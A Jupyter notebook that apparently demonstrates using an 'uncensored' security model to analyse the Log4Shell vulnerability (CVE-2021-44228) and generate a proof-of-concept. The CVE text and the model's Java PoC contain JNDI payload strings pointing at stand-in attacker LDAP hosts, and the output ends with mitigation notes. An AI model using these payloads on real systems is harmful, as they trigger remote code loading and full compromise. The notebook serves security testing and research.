{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "AI5ozM2h2Nva"
   },
   "source": [
    "# Use Case Description\n",
    "\n",
    "Move beyond just identifying exposed assets or CVEs — leverage a powerful uncensored AI model to simulate how each vulnerability in the attack surface could realistically be exploited. This isn't just ASM, it's ASM + Exploit Generation, where the model takes in asset info and vulnerability metadata, and outputs actual attack paths or even exploit code (in safe/internal environments).\n",
    "\n",
    "## Model used for this use case\n",
    "Both Instruct Model and Reasoning Model would be suitable for this task. In this example, we used Reasoning Model."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SetUp\n",
    "\n",
    "The setup scripts below are essentially the same as those in the [Quickstart (Reasoning Model)](https://github.com/RobustIntelligence/foundation-ai-cookbook/blob/main/1_quickstarts/Preview_Quickstart_reasoning_model.ipynb)\n",
    "\n",
    "### Notice\n",
    "- The code below assumes that users have access to the models via Hugging Face. If you are using API access instead, please replace the inference code with the API version provided in the Quickstart guide.\n",
    "- This model is currently in preview mode and may receive updates. As a result, outputs can vary even when parameters are configured to ensure reproducibility."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "id": "BPloud0h2LI9"
   },
   "outputs": [],
   "source": [
    "import os\n",
    "import transformers\n",
    "import torch\n",
    "from IPython.display import display, Markdown\n",
    "\n",
    "HF_TOKEN = os.getenv(\"HF_TOKEN\")\n",
    "\n",
    "def _get_device():\n",
    "    if torch.cuda.is_available():\n",
    "        return \"cuda\"\n",
    "    elif torch.backends.mps.is_available():\n",
    "        return \"mps\"\n",
    "    else:\n",
    "        return \"cpu\"\n",
    "\n",
    "DEVICE = _get_device()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "id": "u5pjZGi32FsI"
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c6763e233a9b46ae8a590df78150e676",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Loading checkpoint shards:   0%|          | 0/7 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "MODEL_ID = \"\" # To be relaced with the final model name\n",
    "\n",
    "from transformers import AutoModelForCausalLM, AutoTokenizer\n",
    "\n",
    "tokenizer = AutoTokenizer.from_pretrained(MODEL_ID, token=HF_TOKEN)\n",
    "model = AutoModelForCausalLM.from_pretrained(\n",
    "    pretrained_model_name_or_path=MODEL_ID,\n",
    "    device_map=\"auto\",\n",
    "    torch_dtype=torch.float32, # this model's tensor_type is float32\n",
    "    token=HF_TOKEN,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "generation_args = {\n",
    "    \"max_new_tokens\": 1024,\n",
    "    \"temperature\": None,\n",
    "    \"repetition_penalty\": 1.2,\n",
    "    \"do_sample\": False,\n",
    "    \"use_cache\": True,\n",
    "    \"eos_token_id\": tokenizer.eos_token_id,\n",
    "    \"pad_token_id\": tokenizer.pad_token_id,\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def inference(prompt):\n",
    "    messages = [\n",
    "        {\"role\": \"user\", \"content\": prompt},\n",
    "    ]\n",
    "    inputs = tokenizer.apply_chat_template(\n",
    "        messages, tokenize=False, add_generation_prompt=True\n",
    "    )\n",
    "\n",
    "    # The old model version didn’t include the <think> token in the chat template.\n",
    "    think_token = \"<think>\\n\"\n",
    "    if not inputs.endswith(think_token):\n",
    "        inputs += think_token\n",
    "    \n",
    "    inputs = tokenizer(inputs, return_tensors=\"pt\").to(DEVICE)\n",
    "    with torch.no_grad():\n",
    "        outputs = model.generate(\n",
    "            **inputs,\n",
    "            **generation_args,\n",
    "        )\n",
    "    response = tokenizer.decode(outputs[0], skip_special_tokens = False)\n",
    "\n",
    "    # extract the thinking part only\n",
    "    match = re.search(r\"<think>(.*?)<\\|end_of_text\\|>\", response, re.DOTALL)\n",
    "    \n",
    "    return match.group(1).strip()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "u27Cc9tk-bL2"
   },
   "source": [
    "## Exploit Analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "id": "-qu7Y6_Z-PGY"
   },
   "outputs": [],
   "source": [
    "def make_prompt(vuln_description):\n",
    "    return f\"\"\"You are a security researcher. Analyze the following vulnerability report and generate:\n",
    "    \n",
    "    1. A concise summary of the issue.\n",
    "    2. Potential impact and affected components.\n",
    "    3. A safe, hypothetical proof-of-concept exploit (for testing only).\n",
    "    \n",
    "    ## VULNERABILITY DESCRIPTION\n",
    "    {vuln_description}\n",
    "    \n",
    "    Ensure the response is for red team / security testing only — no real-world systems or harm implied.\"\"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "qLvay2z4_ZJH"
   },
   "source": [
    "Given the vulnerability report of CVE-2021-44228, have the model to reason and generate a document containing the contents above"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "id": "EWVVmyLi-Zz_"
   },
   "outputs": [],
   "source": [
    "vuln_description = \"\"\"\n",
    "CVE-2021-44228: Log4Shell Remote Code Execution in Apache Log4j\n",
    "\n",
    "Description:\n",
    "A critical remote code execution vulnerability exists in Apache Log4j versions 2.0 to 2.14.1. This flaw allows a remote attacker to execute arbitrary code on the affected system by sending specifically crafted JNDI (Java Naming and Directory Interface) lookup strings through various input vectors. The vulnerability occurs because Log4j evaluates JNDI expressions that can load malicious code from remote servers. Successful exploitation could lead to complete system compromise including data theft, lateral movement within networks, and installation of malware or ransomware.\n",
    "\n",
    "Triggering Mechanism:\n",
    "The vulnerability is triggered when Log4j logs a string containing a specific format like \"${jndi:ldap://malicious-server/payload}\". When this string is processed, Log4j evaluates the JNDI lookup, which can connect to an attacker-controlled LDAP server and load malicious Java code. This can be triggered through various vectors including:\n",
    "- HTTP headers\n",
    "- User-agent strings\n",
    "- Input form fields\n",
    "- Any other data that might be logged\n",
    "\n",
    "Affected Software:\n",
    "- Apache Log4j versions 2.0 to 2.14.1\n",
    "- Thousands of applications and services using vulnerable Log4j versions including:\n",
    "  - Apache Struts\n",
    "  - Apache Solr\n",
    "  - Apache Druid\n",
    "  - Elasticsearch\n",
    "  - Apache Kafka\n",
    "  - Minecraft servers\n",
    "  - VMware Horizon\n",
    "  - Many commercial enterprise products and cloud services\n",
    "\n",
    "References:\n",
    "- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n",
    "- CISA Advisory: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a\n",
    "- Apache Log4j Security Vulnerabilities: https://logging.apache.org/log4j/2.x/security.html\n",
    "\"\"\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "id": "6igoCrpF_cGK"
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "## Summary of Issue\n",
       "\n",
       "**Vulnerability:** CVE-2021-44228 – Log4Shell RCE in Apache Log4j  \n",
       "**Severity:** Critical  \n",
       "**Description:** Apache Log4j versions 2.0 to 2.14.1 contain a remote code execution vulnerability due to improper handling of JNDI lookups. An attacker can send specially crafted log messages with embedded JNDI variables leading to loading of remote code via LDAP. \n",
       "\n",
       "**Impact & Affected Components**\n",
       "\n",
       "* **Potential Impact:** Complete system compromise; attackers may steal sensitive data, move laterally across networks, install malware/ransomware.\n",
       "* **Affected Components:** \n",
       "   * Directly: All applications utilizing Log4j v2.0-2.14.1.\n",
       "   * Indirectly: Various software relying on these Log4j versions such as Apache Struts, Apache Solr, Apache Druid, Elasticsearch, Apache Kafka, Minecraft servers, VMware Horizon, etc., potentially affecting thousands of services worldwide.\n",
       "\n",
       "## Hypothetical Proof-of-Concept Exploit (For Testing Only)\n",
       "\n",
       "To demonstrate the vulnerability without causing actual damage, here's a theoretical POC:\n",
       "\n",
       "```java\n",
       "import org.apache.logging.log4j.LogManager;\n",
       "import org.apache.logging.log4j.Logger;\n",
       "\n",
       "public class PoC {\n",
       "    private static final Logger logger = LogManager.getLogger(PoC.class);\n",
       "\n",
       "    public static void main(String[] args) {\n",
       "        // Trigger the vulnerability by logging a message with a crafted JNDI string\n",
       "        String payload = \"${jndi:ldap://attacker.com/exploit}\";\n",
       "        \n",
       "        try {\n",
       "            logger.error(\"This is a test: \" + payload);\n",
       "        } catch (Exception e) {\n",
       "            System.out.println(\"Log4Shell POC executed successfully.\");\n",
       "        }\n",
       "    }\n",
       "}\n",
       "```\n",
       "\n",
       "### Important Notes:\n",
       "* **Testing Environment:** Use a controlled environment where you have explicit permission to perform tests. Do not run this against any production or unauthorized systems.\n",
       "* **Mitigation Steps:** Before running, ensure your own setup mirrors a vulnerable version of Log4j (e.g., 2.12). Apply fixes immediately after testing. In reality, upgrading to version 2.15.0 or applying the recommended configuration changes (`log4j2.formatMsgNoLookups` set to `true`) would prevent exploitation.\n",
       "* **Ethical Considerations:** Always adhere to ethical guidelines. Unauthorized use of exploits is illegal and unethical."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "response = inference(make_prompt(vuln_description))\n",
    "display(Markdown(response))"
   ]
  }
 ],
 "metadata": {
  "colab": {
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
